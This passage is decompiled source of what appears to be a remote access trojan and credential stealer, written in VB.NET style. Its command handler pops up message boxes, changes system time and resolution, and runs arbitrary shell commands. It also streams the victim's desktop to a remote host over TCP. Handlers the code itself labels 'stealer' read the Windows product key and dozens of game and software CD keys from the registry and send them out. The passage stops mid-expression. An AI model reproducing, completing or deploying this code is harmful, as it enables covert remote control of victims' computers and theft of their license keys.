						SendStatus("Couldn't beep...");
						ProjectData.ClearProjectError();
						break;
					}
				case "MESSAGEBOX":
					try
					{
						SendStatus("Sending messagebox...");
						string[] array11 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						if (Operators.CompareString(array11[0], "1", false) == 0)
						{
							Interaction.MsgBox((object)array11[2], (MsgBoxStyle)64, (object)array11[1]);
						}
						if (Operators.CompareString(array11[0], "2", false) == 0)
						{
							Interaction.MsgBox((object)array11[2], (MsgBoxStyle)48, (object)array11[1]);
						}
						if (Operators.CompareString(array11[0], "3", false) == 0)
						{
							Interaction.MsgBox((object)array11[2], (MsgBoxStyle)32, (object)array11[1]);
						}
						if (Operators.CompareString(array11[0], "4", false) == 0)
						{
							Interaction.MsgBox((object)array11[2], (MsgBoxStyle)16, (object)array11[1]);
						}
						SendStatus("Messagebox executed...");
						break;
					}
					catch (Exception projectError40)
					{
						ProjectData.SetProjectError(projectError40);
						SendStatus("Couldn't send messagebox...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CHANGERESOLUTION":
					try
					{
						SendStatus("Changing resolution...");
						string[] array10 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						resolution.changeRes(Conversions.ToInteger(array10[0]), Conversions.ToInteger(array10[1]));
						SendStatus("Changing resolution...");
						break;
					}
					catch (Exception projectError39)
					{
						ProjectData.SetProjectError(projectError39);
						SendStatus("Couldn't change resolution...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CHANGESTARTTEXT":
					try
					{
						SendStatus("Changing text on start button...");
						SetStartCaption(array[1]);
						SendStatus("Changed text on start button...");
						SendStatus("Time changed...");
						break;
					}
					catch (Exception projectError38)
					{
						ProjectData.SetProjectError(projectError38);
						SendStatus("Couldn't change text on start button...");
						ProjectData.ClearProjectError();
						break;
					}
				case "CHANGETIME":
					try
					{
						string[] array9 = Strings.Split(array[1], "<>", -1, (CompareMethod)0);
						SendStatus("Changing time...");
						DateAndTime.set_TimeOfDay(Conversions.ToDate(array9[0] + ":" + array9[1] + ":" + array9[2]));
						SendStatus("Time changed...");
						break;
					}
					catch (Exception projectError37)
					{
						ProjectData.SetProjectError(projectError37);
						SendStatus("Couldn't change time...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETSOFTWARE":
					try
					{
						SendStatus("Getting software list...");
						string text20 = "";
						string text21 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
						string[] subKeyNames = ((ServerComputer)Class1.Class0_0).get_Registry().get_LocalMachine().OpenSubKey(text21)!.GetSubKeyNames();
						foreach (string text22 in subKeyNames)
						{
							if (Operators.ConditionalCompareObjectNotEqual(((ServerComputer)Class1.Class0_0).get_Registry().get_LocalMachine().OpenSubKey(text21 + text22 + "\\")!.GetValue("DisplayName"), (object)"", false))
							{
								text20 = Conversions.ToString(Operators.AddObject((object)text20, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(((ServerComputer)Class1.Class0_0).get_Registry().get_LocalMachine().OpenSubKey(text21 + text22 + "\\")!.GetValue("DisplayName"), (object)"--"), ((ServerComputer)Class1.Class0_0).get_Registry().get_LocalMachine().OpenSubKey(text21 + text22 + "\\")!.GetValue("UninstallString")), (object)"<>")));
							}
						}
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|SOFTWARELIST", object_0), (object)text20)));
						SendStatus("Software list sent...");
						break;
					}
					catch (Exception projectError36)
					{
						ProjectData.SetProjectError(projectError36);
						SendStatus("Couldn't get software list...");
						ProjectData.ClearProjectError();
						break;
					}
				case "UNINSTALLAPP":
					try
					{
						SendStatus("Uninstalling program...");
						Interaction.Shell(array[1], (AppWinStyle)1, false, -1);
						SendStatus("Command executed...");
						break;
					}
					catch (Exception projectError35)
					{
						ProjectData.SetProjectError(projectError35);
						SendStatus("Couldn't uninstall program...");
						ProjectData.ClearProjectError();
						break;
					}
				case "STARTDESKTOPSTREAM":
				{
					bool_0 = true;
					tcpClient_1 = new TcpClient(string_1, (int)Math.Round(Conversion.Val((object)int_0) + Conversion.Val((object)1)));
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						StreamDesktop();
					});
					thread2.Start();
					break;
				}
				case "STOPDESKTOPSTREAM":
					bool_0 = false;
					tcpClient_1.Close();
					break;
				case "GETWINDOWSPRODUCTKEY":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|PRODUCTKEY", object_0), (object)GetProductKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", "DigitalProductId"))));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError34)
					{
						ProjectData.SetProjectError(projectError34);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETDEFAULTBROWSER":
					try
					{
						SendStatus("Sending stealer command...");
						Send(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"INFO|DEFBROWSER", object_0), (object)defaultbrowser())));
						SendStatus("Log sent...");
						break;
					}
					catch (Exception projectError33)
					{
						ProjectData.SetProjectError(projectError33);
						SendStatus("Couldn't execute stealer...");
						ProjectData.ClearProjectError();
						break;
					}
				case "GETMYSERIALS":
					try
					{
						SendStatus("Sending stealer command...");
						string text17 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"NFS Carbon: ", method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed Carbon", "ergc")), (object)"|"), (object)"NFS Hot Pursuit 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2", "ergc")), (object)"|"), (object)"NFS Most Wanted: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need for Speed Most Wanted", "ergc")), (object)"|"), (object)"NFS Pro-Street: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Need for Speed ProStreet", "ergc")), (object)"|"), (object)"NFS Under-Ground: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground", "ergc")), (object)"|"), (object)"NFS Under-Ground 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Need for Speed Underground 2", "ergc")), (object)"|"), (object)"Medieval II Total War: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\SEGA\\Medieval II Total War", "CDKey")), (object)"|"), (object)"Adobe GoLive 5: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Golive\\5.0\\Registration", "SERIAL")), (object)"|"), (object)"Nero 7: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\ahead\\Installation\\BAK\\Nero 7\\Info", "Serial7_1190555485")), (object)"|"), (object)"Splinter Cell Pandora Tomorrow: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", "CDKey")), (object)"|"), (object)"Splinter Cell Chaos Theory: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys", "DiscKey_SCCT")), (object)"|"), (object)"COD: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty", "codkey")), (object)"|"), (object)"COD United Offense: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty United Offensive", "key")), (object)"|"), (object)"COD 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2", "codkey")), (object)"|"), (object)"COD 4: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 4", "codkey")), (object)"|"), (object)"COD WAM: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty WAW", "codkey")), (object)"|"), (object)"Dawn Of War: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Dawn of War", "CDKEY")), (object)"|"), (object)"PicaView: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\ACD Systems\\PicaView", "LicenseNumber")), (object)"|"), (object)"Act Of War: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Eugen Systems\\ActOfWa", "RegNumber")), (object)"|"), (object)"Photoshop 7: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Adobe\\Photoshop\\7.0\\Registration", "SERIAL")), (object)"|"), (object)"Elcom PDF Pass-Recovery: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery\\Registration", "Code")), (object)"|"), (object)"Elcom-Pro PDF Pass-Recovery: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced PDF Password Recovery Pro\\Registration", "Code")), (object)"|"), (object)"Elcom Zip Pass-Recovery: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Elcom\\Advanced ZIP Password Recovery\\Registration", "Code")), (object)"|"), (object)"Battlefield Vietnam: "), method_2("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam", "ergc")), (object)"|"), (object)"Black and White: "), method_2("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\EA GAMES\\Black and White", "ergc")), (object)"|"), (object)"Black and White 2: "), method_2("HKEY_LOCAL_MACHINE\\Software\\Electronic Arts\\Black and White 2", "ergc")), (object)"|"), (object)"Boulder Dash Rocks: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Boulder Dash Rocks", "ergc")), (object)"|"), (object)"Burnout Paradise: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Burnout Paradise", "ergc")), (object)"|"), (object)"Anno 1701: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sunflowers\\Anno 1701", "SerialNo")), (object)"|"), (object)"WinOptimizer Platinum 3: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\ashampoo\\Ashampoo WinOptimizer Platinum 3", "Key")), (object)"|"), (object)"L0pht Crack: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\@stake\\LC5\\Registration", "Unlock Code")), (object)"|"), (object)"BattleField 1942: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942", "ergc")), (object)"|"), (object)"Battlefield 1942 Secret Weapons of WWII: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII", "ergc")), (object)"|"), (object)"BattleField 1942 Road To Rome: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome", "ergc")), (object)"|"), (object)"BattleField 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Battlefield 2", "ergc")), (object)"|"), (object)"BattleField 2142: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 2142", "ergc")), (object)"|"), (object)"Camtasia6 (User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegisteredTo")), (object)"|"), (object)"Camtasia6 (Key): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\TechSmith\\Camtasia Studio\\6.0", "RegistrationKey")), (object)"|"), (object)"TechLand Chrome: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Techland\\Chrome", "SerialNumber")), (object)"|"), (object)"Codec Tweak Tool: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Codec Tweak Tool", "serial")), (object)"|"), (object)"C&C Generals: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Generals", "ergc")), (object)"|"), (object)"C&C Generals Zero Hour: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour", "ergc")), (object)"|"), (object)"Red Alert 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert 2", "Serial")), (object)"|"), (object)"Red Alert: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Red Alert", "Serial")), (object)"|"), (object)"C&C Tiberian Sun: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Westwood\\Tiberian Sun", "Serial")), (object)"|"), (object)"C&C 3: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Command and Conquer 3", "ergc")), (object)"|"), (object)"Counter-Strike: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Counter-Strike\\Settings", "Key")), (object)"|"), (object)"Crysis: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc")), (object)"|"), (object)"PowerDVD: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerDVD", "CDKey")), (object)"|"), (object)"PowerBar: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Cyberlink\\PowerBar", "CDKey")), (object)"|"), (object)"PowerProducer 3.0: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\CyberLink\\PowerProducer\\3.0\\UserReg", "SR_No")), (object)"|"), (object)"Day of Defeat: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Day of Defeat\\Settings", "Key")), (object)"|"), (object)"The Battle for Middle-earth II: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\The Battle for Middle-earth II", "ergc")), (object)"|"), (object)"Sims 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2", "ergc")), (object)"|"), (object)"Sims 2 University: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 University", "ergc")), (object)"|"), (object)"Sims 2 Nightlife: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Nightlife", "ergc")), (object)"|"), (object)"Sims 2 Open For Business: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Open For Business", "ergc")), (object)"|"), (object)"Sims 2 Pets: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\Electronic Arts\\Crysis", "ergc")), (object)"|"), (object)"Sims 2 Seasons: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Seasons", "ergc")), (object)"|"), (object)"Sims 2 Glamour Life Stuff: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Glamour Life Stuff", "ergc")), (object)"|"), (object)"Sims 2 Celebration Stuff: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Celebration Stuff", "ergc")), (object)"|"), (object)"Sims 2 Fashion Stuff: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 H M Fashion Stuff", "ergc")), (object)"|"), (object)"Sims 2 Family-Fun: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\The Sims 2 Family Fun Stuff", "ergc")), (object)"|"), (object)"DVD Audio Extractor(User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Name")), (object)"|"), (object)"DVD Audio Extractor(Key): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\DVD Audio Extractor\\Settings", "Reg Number")), (object)"|"), (object)"Empire Earth II: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\Empire Earth II", "CDKey")), (object)"|"), (object)"FEAR: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Sierra\\CDKey", "fear")), (object)"|"), (object)"iLauncher: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\F-Secure\\BackWeb\\iLauncher", "UID")), (object)"|"), (object)"Far Cry: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY\\UBI.COM", "CDKey")), (object)"|"), (object)"Far Cry 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\CRYTEK\\FARCRY2\\UBI.COM", "CDKey")), (object)"|"), (object)"FIFA 2002: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002", "ergc")), (object)"|"), (object)"FIFA 2003: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003", "ergc")), (object)"|"), (object)"FIFA 2004: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2004", "ergc")), (object)"|"), (object)"FIFA 2005: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2005", "ergc")), (object)"|"), (object)"FIFA 2007: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 07", "ergc")), (object)"|"), (object)"FIFA 2008: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 08", "ergc")), (object)"|"), (object)"Freedom Force: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force", "ergc")), (object)"|"), (object)"Frontlines: Fuel of War(Beta): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War Beta", "ProductKey")), (object)"|"), (object)"Frontlines: Fuel of War: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\THQ\\Frontlines: Fuel of War", "ProductKey")), (object)"|"), (object)"GetRight(Headlight): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Headlight\\GetRight", "GRcode")), (object)"|"), (object)"Global Operations: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations", "ergc")), (object)"|"), (object)"GunMan: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Gunman", "Settings")), (object)"|"), (object)"Half-Life: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Half-Life\\Setting", "Key")), (object)"|"), (object)"HellGate London: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA Games\\Hellgate: London", "ergc")), (object)"|"), (object)"Hidden&Dangerous 2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key")), (object)"|"), (object)"IGI 2 Retail: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey")), (object)"|"), (object)"InCD(User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "UserName")), (object)"|"), (object)"InCD(License): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ahead\\InCD", "License")), (object)"|"), (object)"IG2: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\JoWooD\\InstalledGames\\IG2", "prvkey")), (object)"|"), (object)"AVConverter-Ipod(User): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "User Name")), (object)"|"), (object)"AVConverter-Ipod(License): "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\AVConverter\\iPod Converter", "Registration Code")), (object)"|"), (object)"007 Nightfire: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire", "ergc")), (object)"|"), (object)"Legends of Might and Magic: "), method_2("HKEY_LOCAL_MACHINE\\SOFTWARE\\3d0\\Status Legends of Might and Magic", "CustomerNumber")), (object)"|"), (object)"Flash 7: "), 